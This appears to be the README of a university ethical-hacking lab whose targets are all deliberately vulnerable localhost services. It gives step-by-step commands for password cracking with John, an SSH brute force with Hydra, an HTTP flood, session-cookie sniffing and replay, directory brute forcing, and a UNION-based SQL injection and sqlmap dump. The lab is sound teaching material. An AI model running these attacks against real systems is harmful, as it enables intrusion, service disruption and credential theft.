# Bonus Task 2: Ethical Hacking Lab — Social Engineering, DoS, Session Hijacking, Web & SQL Injection, with AI (20 Points)

Welcome to the Ethical Hacking Bonus Lab! This hands-on lab provides a secure environment aligned with CEHv13 topics to:

- Practice password hash analysis and cracking using John the Ripper
- Perform SSH brute-force attacks with Hydra
- Capture and analyze network traffic using tcpdump
- Identify phishing techniques and red flags in suspicious emails (Social Engineering)
- Simulate a Denial-of-Service flood attack and analyze the impact
- Perform session hijacking by capturing and replaying a stolen session cookie
- Run web server/web application reconnaissance to uncover a hidden resource
- Exploit a SQL injection vulnerability to extract and crack a password hash

All activities are performed inside a single GitHub Codespace container, with all required tools pre-installed and several deliberately vulnerable local-only services running automatically.

> ⚠️ **For educational use only.** Never attempt these techniques on systems you do not own or lack explicit written permission to test. Every target in this lab runs on `localhost`/loopback only.

## Objectives

In this lab, you'll get hands-on experience with password hash analysis and cracking, SSH brute-force attacks, network traffic analysis, phishing awareness, DoS attack simulation, session hijacking, web server/web app reconnaissance, and SQL injection exploitation.

> These objectives will help you understand how attackers exploit weak credentials, user behavior, network protocols, and vulnerable applications — and how to defend against these threats in real-world scenarios.

---
## Ethics & Legal Notes

**Please remember**, you should only test and attack the services provided by this lab (all bound to `localhost`). You should never target external or production systems. Everything you do here is just for learning, so don't use these techniques outside of approved environments.

---
## Getting Started

To begin the lab:

1. Open this repository in GitHub Codespaces.
2. Wait for the setup script to finish. Several localhost-only services start automatically (see below) and log to `/tmp/`.
3. Confirm services are running by executing:
	- `ps aux | grep -E "sshd|dos_target|session_app|vuln_login_app|http.server"`
	- `tail -n +1 /tmp/sshd.log /tmp/dos_target.log /tmp/session_app.log /tmp/vuln_login_app.log /tmp/webrecon.log`
4. If a service isn't running (e.g., after resuming a stopped Codespace), restart everything with:
	```sh
	bash scripts/start_services.sh
	```

---
## Key Lab Files

- `users.txt`, `passwords.txt`
- `hash.txt` (SHA-512 crypt)
- `phishing_email.txt`
- `LAB_START_HERE.txt` (quick commands)
- `apps/` — source for the lab's vulnerable local services (DoS target, session app, SQLi app)
- `webroot/` — static site used for the web recon exercise
- `scripts/` — helper wordlists and **auto-grading scripts** (see below)

---
## Services in the Lab

| Service | Address | Used In |
|---|---|---|
| SSH | `127.0.0.1:22` (user: `testuser`) | Task 1, 2 |
| DoS target app | `http://localhost:8080` (`/`, `/stats`, `/reset`) | Task 5 |
| Session hijacking app | `http://localhost:5001` (`/login`, `/account`) | Task 6 |
| SQL injection app | `http://localhost:5002` (`/user?id=`) | Task 8 |
| Web recon site | `http://localhost:8000` | Task 7 |

## Lab Tasks (Total: 20 Points)

Before you begin, make sure all scripts in the `scripts/` and `apps/` folders are executable. Run this command once during setup:

```sh
chmod +x scripts/*.sh apps/*.sh
```

Every task below has a matching auto-grading script in `scripts/` (e.g. `scripts/grade_task5_dos.sh`). Run `bash scripts/grade_all.sh` at any time to see your current auto-gradable score. Task 3 is reviewed manually from your screenshot.

---

### 1. Hash Cracking with John the Ripper (2 pts)
**Goal:** Recover the lab user's password from `hash.txt`.

In this task, you'll use John the Ripper to attempt to crack a password hash. The first command tells John to use the passwords listed in `passwords.txt` to try and match the hash stored in `hash.txt`. If successful, John will discover the original password. The second command displays any cracked credentials in a readable format. This process demonstrates how attackers can recover weak passwords if hashes and wordlists are available.

Commands:
```sh
john --wordlist=passwords.txt hash.txt
john --show hash.txt
```

**Deliverables:**
- Screenshot or copy of the cracked credentials line.
- Brief explanation (2–3 sentences) of how the `$6$` (SHA-512 crypt) format works.

**Auto-grade:** `bash scripts/grade_task1_hash.sh`

> [John the Ripper password cracker](https://www.openwall.com/john/) : "John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems. John the Ripper jumbo supports hundreds of hash and cipher types, including for: user passwords of Unix flavors (Linux, *BSD, Solaris, AIX, QNX, etc.),"
---

### 2. SSH Brute-Force with Hydra (3 pts)
**Goal:** Use a small dictionary attack against the local SSH service.

In this task, you will use Hydra to automate login attempts against the SSH service running on localhost. Hydra will try each username from `users.txt` with each password from `passwords.txt`, attempting to find a valid login combination. This simulates a real-world brute-force attack, where attackers use lists of common credentials to gain unauthorized access.

Command:
```sh
hydra -L users.txt -P passwords.txt ssh://localhost
```
After running the command, Hydra will report any successful login attempts, showing the username and password that worked. This demonstrates how weak or reused credentials can be exploited by attackers.

**Troubleshooting:**

If you encounter a "connection refused" error when running Hydra, ensure the OpenSSH server is installed and running:

```sh
# Check if OpenSSH server is installed
dpkg -l | grep openssh-server || { 
	sudo apt-get update && sudo apt-get install -y openssh-server; 
}
# Start the SSH service if it's not running
sudo service ssh start
```

**Deliverables:**
- Screenshot: Hydra output showing the discovered login/password.
- Brief explanation (2–3 sentences) of how online brute-force differs from offline hash cracking.

**Auto-grade:** `bash scripts/grade_task2_hydra.sh`

> [hydra](https://www.kali.org/tools/hydra/?utm_source=chatgpt.com)
---

### 3. Traffic Capture & Analysis (3 pts)
**Goal:** Capture and analyze network packets generated by basic traffic.

In this task, you'll use `tcpdump` to monitor and record network activity on your system. By running `tcpdump`, you can see real-time packets as they travel across the network interface. Generating traffic with commands like `curl` (for HTTP) and `ssh` (for SSH) will produce different types of packets, allowing you to observe how various protocols appear in packet captures. This exercise helps you understand how network tools can be used to inspect and troubleshoot network communications, and how attackers or defenders might analyze traffic for signs of compromise or misuse.

**Instructions:**
1. In one terminal, start packet capture:

	The following command uses `tcpdump` to capture 20 packets from any network interface on your system. This allows you to observe live network traffic and analyze the types of packets being transmitted:
	```sh
	sudo tcpdump -i any -c 20
	```
2. While tcpdump is running, open another terminal and generate network traffic:
	```sh
	curl https://example.com
	ssh testuser@localhost
	```
	(You can use either or both commands to observe different types of packets.)

3. Review the tcpdump output to identify packet types such as TCP handshakes, DNS lookups, SSH, and HTTP traffic.

**Deliverables:**
- Take a screenshot of your tcpdump output showing captured packet types (e.g., TCP handshake, DNS lookup).
- Use a yellow highlight or annotation tool to mark and call out key packet types in your screenshot, especially any SSH or HTTP packets you observe.
- Briefly describe the highlighted packets and explain their significance in your answer.

**Grading:** Reviewed manually from your submitted screenshot (not auto-graded).

---

### 4. Phishing Email Red-Flags (2 pts)
**Goal:** Learn to spot common signs of phishing in suspicious emails. *(CEHv13: Social Engineering Techniques and Exploits)*

**Instructions:**
1. Open the file `phishing_email.txt` and read the email carefully.
2. Identify at least five red flags that indicate the email may be a phishing attempt. Common red flags include:
	- Generic greeting (e.g., "Dear user")
	- Suspicious or mismatched links
	- Requests for sensitive information
	- Poor spelling or grammar
	- Urgent or threatening language
	- Unexpected attachments
	- Sender address that doesn't match the organization
3. For each red flag, briefly explain why it is suspicious.
4. In your answer, write a short paragraph listing the five red flags you found and describe how a user can verify if an email is legitimate (e.g., checking the sender's address, hovering over links, contacting the organization directly).

**Deliverable:**
- Short paragraph listing at least five red flags and how a user should verify legitimacy, written into `yourAnswers.md`.

**Auto-grade:** `bash scripts/grade_task4_phishing.sh` (keyword-based check against `yourAnswers.md`)

---

### 5. Denial-of-Service Attack Simulation (2 pts)
**Goal:** Simulate a volumetric DoS flood against a local test service and measure its impact. *(CEHv13: Denial-of-Service Attacks)*

A small Flask app (`apps/dos_target.py`) is already running on port 8080. It counts every request it receives and exposes a `/stats` endpoint with the running totals.

**Instructions:**
1. (Optional, for your screenshot) In one terminal, observe the flood at the packet level, reusing your Task 3 skill:
	```sh
	sudo tcpdump -i lo -c 50 'tcp port 8080'
	```
2. In another terminal, launch the flood using ApacheBench, a real-world load/DoS-testing tool (1000 requests, 50 concurrent connections):
	```sh
	ab -n 1000 -c 50 http://localhost:8080/
	```
3. Save the resulting service statistics as your deliverable:
	```sh
	curl -s http://localhost:8080/stats -o dos_report.json
	cat dos_report.json
	```
4. If you want to try again, reset the counter first: `curl http://localhost:8080/reset`

**Deliverables:**
- `dos_report.json` committed at the repository root (auto-graded).
- Screenshot of your tcpdump/`ab` output.
- Brief explanation (2–3 sentences) of how this HTTP flood relates to SYN floods and ICMP floods, and why a real DoS attack is harder to stop.

**Auto-grade:** `bash scripts/grade_task5_dos.sh` (checks that `dos_report.json` shows the service received the flood)

---

### 6. Session Hijacking via Cookie Theft & Replay (3 pts)
**Goal:** Capture another user's session cookie in transit and reuse it to access a protected resource without their credentials. *(CEHv13: Session Hijacking Concepts)*

A Flask app (`apps/session_app.py`) is running on port 5001. A background script simulates an "admin" user logging in every ~15 seconds over **plaintext HTTP**, generating a fresh session cookie each time — just like a real user would.

**Instructions:**
1. Capture the admin's plaintext HTTP traffic for ~20 seconds (long enough to catch a login):
	```sh
	sudo timeout 20 tcpdump -i lo -A -s 0 'tcp port 5001' > session_capture.log 2>&1
	```
2. Search the capture for the stolen session cookie:
	```sh
	grep -o 'session=[a-f0-9]*' session_capture.log | head -n 1
	```
3. Replay the stolen cookie to access the protected `/account` endpoint **without ever logging in yourself**:
	```sh
	curl -s -b "session=<paste_stolen_token_here>" http://localhost:5001/account -o session_hijack_flag.txt
	cat session_hijack_flag.txt
	```

**Deliverables:**
- `session_hijack_flag.txt` committed at the repository root (auto-graded).
- Brief explanation (2–3 sentences) of why HTTPS and short-lived/rotating session tokens would have prevented this attack.

**Auto-grade:** `bash scripts/grade_task6_session.sh`

---

### 7. Web Server & Web Application Reconnaissance (2 pts)
**Goal:** Discover a hidden resource on a local web server using standard recon tools. *(CEHv13: Compromising Web Servers / Web Application Hacking)*

A static site is running at `http://localhost:8000`, hosted by a plain Python web server.

**Instructions:**
1. Scan the server for general vulnerabilities/misconfigurations:
	```sh
	nikto -h http://localhost:8000
	```
2. Brute-force hidden directories using the provided wordlist:
	```sh
	dirb http://localhost:8000/ scripts/web_wordlist.txt
	```
3. Once you find the hidden directory, retrieve the flag it contains:
	```sh
	curl http://localhost:8000/hidden-admin/flag.txt -o web_recon_flag.txt
	cat web_recon_flag.txt
	```

**Deliverables:**
- `web_recon_flag.txt` committed at the repository root (auto-graded).
- Screenshot of your `nikto` or `dirb` output.
- Brief explanation (2–3 sentences) of why unlisted/hidden directories are still a security risk even if they aren't linked from the site's navigation.

**Auto-grade:** `bash scripts/grade_task7_webrecon.sh`

---

### 8. SQL Injection Exploitation & Credential Cracking (3 pts)
**Goal:** Exploit a SQL injection vulnerability to dump password hashes, then crack the recovered hash. *(CEHv13: SQL Injection Methodologies)*

A Flask + SQLite app (`apps/vuln_login_app.py`) is running on port 5002. Its `/user?id=` endpoint builds SQL queries using raw string concatenation, making it vulnerable to injection.

**Instructions:**
1. Try a normal request first:
	```sh
	curl "http://localhost:5002/user?id=1"
	```
2. Exploit the injection with a UNION-based payload to dump every row (including the `admin` user's password hash):
	```sh
	curl "http://localhost:5002/user?id=0%20UNION%20SELECT%20id,username,password_hash%20FROM%20users--%20-"
	```
	Or automate discovery/dumping with sqlmap:
	```sh
	sqlmap -u "http://localhost:5002/user?id=1" --batch --dump
	```
3. Copy the `admin` user's password hash into a file in this exact format:
	```sh
	echo "admin:<paste_password_hash_here>" > sqli_extracted_hash.txt
	```
4. Crack the extracted hash using John the Ripper and the provided wordlist:
	```sh
	john --wordlist=scripts/sqli_wordlist.txt sqli_extracted_hash.txt
	john --show sqli_extracted_hash.txt
	```
5. Save the cracked plaintext password as your deliverable:
	```sh
	echo "admin:<cracked_password_here>" > sqli_cracked_password.txt
	```

**Deliverables:**
- `sqli_extracted_hash.txt` and `sqli_cracked_password.txt` committed at the repository root (auto-graded).
- Brief explanation (2–3 sentences) of one countermeasure (e.g., parameterized queries) that would have prevented this SQL injection.

**Auto-grade:** `bash scripts/grade_task8_sqli.sh`

---

## Auto-Grading

Run the full auto-grader at any time to check your progress:

```sh
bash scripts/grade_all.sh
```

This runs each task's grading script (`scripts/grade_task*.sh`) and prints a pass/fail line with the points earned, plus a total. Task 3 is always reviewed manually from your screenshot since it has no file-based deliverable.

## Report Template
Fill out `yourAnswers.md` as you complete each task.


## Submitting Your Work


**Important:** Before you close your Codespace, always commit and push your changes to avoid losing any work.

After completing all tasks and filling out `yourAnswers.md`, follow these steps to commit and push your changes:

1. Open the terminal in VS Code.
2. Stage your changes:
	```sh
	git add .
	```
3. Commit your work with a descriptive message:
	```sh
	git commit -m "Complete lab tasks and answers"
	```
4. Push your changes to the repository:
	```sh
	git push
	```
5. Verify your changes are visible on GitHub.


